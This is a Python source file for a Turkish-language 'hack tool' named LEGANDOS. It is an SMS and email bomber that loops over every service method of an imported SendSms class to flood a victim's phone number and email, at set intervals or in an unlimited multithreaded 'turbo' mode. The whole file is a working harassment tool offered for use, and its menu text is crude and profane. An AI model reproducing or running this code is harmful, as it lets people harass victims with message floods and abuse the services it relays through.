from sms import SendSms
import threading
import pyfiglet
from termcolor import colored
from time import sleep
import os
from colorama import init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def title_banner():
    clear()
    ascii_banner = pyfiglet.figlet_format("LEGANDOS", font="slant")
    print(colored(ascii_banner, "cyan"))
    print(colored("by @L3G@NDØS", "green"))
    print(colored("~ Legend Hack Tool Interface ~", "magenta"))
    print()

def renkli_secim_menusu():
    print(colored("[01]", "yellow"), colored("SMS Gönder (RELAX)", "white"))
    print(colored("[02]", "red"), colored("SMS Gönder (DEHŞET)", "white"))
    print(colored("[03]", "magenta"), colored("SİKTİR GİT", "white"))
    print()

def get_input(prompt, color="cyan"):
    return input(colored(prompt, color))

# Servisleri topla
servisler_sms = []
for attr in dir(SendSms):
    if callable(getattr(SendSms, attr)) and not attr.startswith("__"):
        servisler_sms.append(attr)

# Ana döngü
while True:
    title_banner()
    print(colored(f"Sms servis sayısı: {len(servisler_sms)}", "cyan"))
    print()
    renkli_secim_menusu()

    try:
        secim = get_input("Seçim: ")
        if not secim: continue
        menu = int(secim)
    except ValueError:
        print(colored("Hatalı giriş yaptın nabion aq tekrar dene", "red"))
        sleep(2)
        continue

    if menu == 3:
        print(colored("SİKTİR OLUP GİDİLİYOR...", "magenta"))
        break

    elif menu in [1, 2]:
        tel_no = get_input("Telefon numarası (başında +90 olmasın): ")
        try:
            int(tel_no)
            if len(tel_no) != 10: raise ValueError
        except ValueError:
            print(colored("Hatalı telefon numarası nabion aq tekrar dene", "red"))
            sleep(2)
            continue

        mail = get_input("Mail adresi (bilmiyorsan boş bırak): ")
        if ("@" not in mail or ".com" not in mail) and mail != "":
            print(colored("Hatalı mail adresi nabion aq tekrar dene", "red"))
            sleep(2)
            continue

        if menu == 1:
            try:
                kere = get_input("Kaç adet SMS göndermek istiyon kral (sonsuz için boş bırak): ")
                kere = int(kere) if kere else None
            except ValueError:
                print(colored("Hatalı giriş yaptın nabion aq tekrar dene", "red"))
                sleep(2)
                continue

            try:
                aralik = int(get_input("Kaç saniye aralıkla göndermek istiyorsun kral: "))
            except ValueError:
                print(colored("Hatalı giriş yaptın nabion aq tekrar dene", "red"))
                sleep(2)
                continue

            sms = SendSms(tel_no, mail)
            if kere is None:
                while True:
                    for fonk in servisler_sms:
                        getattr(sms, fonk)()
                        sleep(aralik)
            else:
                while sms.adet < kere:
                    for fonk in servisler_sms:
                        if sms.adet >= kere:
                            break
                        getattr(sms, fonk)()
                        sleep(aralik)

        else:
            send_sms = SendSms(tel_no, mail)
            dur = threading.Event()

            def turbo():
                while not dur.is_set():
                    threads = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        threads.append(t)
                        t.start()
                    for t in threads: t.join()

            try:
                turbo()
            except KeyboardInterrupt:
                dur.set()
                print(colored("Ctrl+C algılandı. Menüye dönülüyor...", "cyan"))
                sleep(2)
